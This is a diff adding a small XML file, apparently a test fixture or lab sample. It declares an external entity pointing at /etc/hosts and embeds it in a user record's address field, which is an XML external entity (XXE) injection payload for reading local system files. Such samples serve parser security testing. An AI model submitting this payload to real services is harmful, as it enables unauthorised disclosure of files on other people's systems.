@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE foo [
+<!ENTITY pass SYSTEM "/etc/hosts">
+]>
+<user>
+  <name>yoden</name>
+  <address>&pass;</address>
+</user>
